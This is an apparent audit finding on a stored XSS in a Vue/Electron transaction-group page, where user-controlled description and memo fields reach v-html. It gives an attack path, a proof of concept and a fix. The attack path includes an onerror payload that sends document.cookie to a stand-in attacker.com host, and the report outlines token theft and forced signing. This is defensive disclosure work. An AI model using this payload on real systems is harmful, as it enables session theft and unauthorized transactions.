### Title
Stored XSS via Unsanitized `v-html` Rendering of User-Controlled `description` and `transactionMemo` in Transaction Group Creation Page

### Summary
In `front-end/src/renderer/pages/CreateTransactionGroup/CreateTransactionGroup.vue`, a `v-html` directive renders user-controlled `groupItem.description` and `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` directly as raw HTML without any sanitization. In Organization Mode, where transaction groups are stored on the shared backend and can be loaded by other org members via the "Continue" button, a malicious user can inject arbitrary HTML/JavaScript that executes in the Electron renderer process of any other org member who opens the group.

### Finding Description

**Root Cause:**

In `CreateTransactionGroup.vue` at lines 421–429, the template uses `v-html` to render a ternary expression that falls through to user-controlled values:

```vue
v-html="
  groupItem.type == 'Transfer Transaction'
    ? makeTransfer(index)
    : groupItem.description != ''
      ? groupItem.description
      : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        ? Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        : createTransactionId(groupItem.payerAccountId, groupItem.validStart)
"
``` [1](#0-0) 

Vue's `v-html` directive bypasses its own template-level HTML escaping and injects the string directly into the DOM as raw HTML. Both `groupItem.description` and `transactionMemo` are fully attacker-controlled strings with no sanitization applied at any layer:

- `groupItem.description` originates from the `TransactionInfoControls.vue` text area, validated only by a 256-character limit with no HTML stripping. [2](#0-1) 

- `transactionMemo` is embedded in the serialized transaction bytes stored on the backend and deserialized client-side via `Transaction.fromBytes(...)`. The DTO for creating a transaction comment has no HTML sanitization either. [3](#0-2) 

**Attack Path (Organization Mode):**

1. Attacker (authenticated org member) creates a transaction and sets `description` to `<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">` (or any JS payload).
2. Attacker adds this transaction to a group and saves/submits it to the org backend.
3. The group appears in the shared "Groups" tab visible to other org members.
4. Victim org member clicks the "Continue" button on the group in `Groups.vue` (line 207), which loads `CreateTransactionGroup.vue` with the group's items. [4](#0-3) 

5. The `v-html` directive renders the attacker's payload as raw HTML in the victim's Electron renderer process — the script executes.

The same path applies via `transactionMemo`: if `description` is empty, the memo extracted from the transaction bytes is rendered via `v-html` with no escaping.

**Contrast with safe rendering elsewhere:** All other places in the codebase that display user-provided strings (transaction description in `TransactionDetails.vue`, `TransactionNodeRow.vue`, `History.vue`, `TransactionGroupDetails.vue`) use Vue's safe `{{ }}` interpolation, which auto-escapes HTML. The email templates explicitly use `escapeHtml()`. Only this one `v-html` block is unsafe. [5](#0-4) [6](#0-5) 

### Impact Explanation

This is a **stored cross-user XSS** in an Electron desktop application. The impact is elevated beyond a typical browser XSS:

- The Electron renderer process has access to IPC channels (`ipcRenderer`). Injected JavaScript can invoke IPC handlers to trigger transaction signing, key operations, or file system access depending on what the preload script exposes.
- Even without `nodeIntegration`, the attacker can steal JWT tokens stored in memory/localStorage, impersonate the victim to the backend API, approve or sign transactions on the victim's behalf, and exfiltrate locally cached key material accessible via IPC.
- In an organization multi-sig workflow, forcing a victim to unknowingly sign a malicious transaction is a direct path to unauthorized asset movement on the Hedera network.

### Likelihood Explanation

- **Attacker preconditions:** Must be an authenticated member of the same organization — a realistic insider-threat or compromised-account scenario.
- **Victim action required:** Victim must click "Continue" on a group in the Groups tab — a normal, expected workflow action.
- **No special privileges needed:** Any org member can create transactions and groups.
- **No client-side mitigations:** There is no Content Security Policy (CSP) enforced in the renderer, no DOMPurify, and no server-side stripping of HTML from the `description` or `transactionMemo` fields.

### Recommendation

Replace the `v-html` binding with a safe computed property that uses Vue's `{{ }}` interpolation, or sanitize the value before passing it to `v-html`:

```vue
<!-- Safe: use text interpolation instead of v-html -->
<div ...>
  {{ groupItemLabel(index, groupItem) }}
</div>
```

```ts
function groupItemLabel(index: number, groupItem: GroupItem): string {
  if (groupItem.type === 'Transfer Transaction') return makeTransferText(index); // plain text
  if (groupItem.description) return groupItem.description;
  const memo = Transaction.fromBytes(groupItem.transactionBytes).transactionMemo;
  return memo || createTransactionId(groupItem.payerAccountId, groupItem.validStart);
}
```

If `makeTransfer` genuinely requires HTML (e.g., for bold formatting), sanitize its output with DOMPurify before passing to `v-html`, and ensure `description` and `transactionMemo` are never passed through `v-html` without sanitization. Additionally, add server-side validation to strip or reject HTML tags in `description` and `name` fields on the backend DTO.

### Proof of Concept

1. Log in as Org Member A (attacker).
2. Create any transaction (e.g., Account Create) and set the **Transaction Description** field to:
   ```
   <img src=x onerror="alert('XSS:'+document.title)">
   ```
3. Submit the transaction to the org backend.
4. Navigate to "Create Transaction Group", click "Add Transaction", and add the transaction created in step 2. Save the group.
5. Log in as Org Member B (victim) in a separate session.
6. Navigate to the **Transactions → Groups** tab.
7. Click the **"Continue"** button on the group created by Member A.
8. **Expected result:** The `alert()` fires in Member B's Electron renderer process, confirming stored XSS execution. In a real attack, replace `alert()` with an IPC call or credential exfiltration payload.

export function escapeHtml(str: string | null | undefined): string {
  if (str == null) {
    return "";
  }

  const value = String(str);

  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
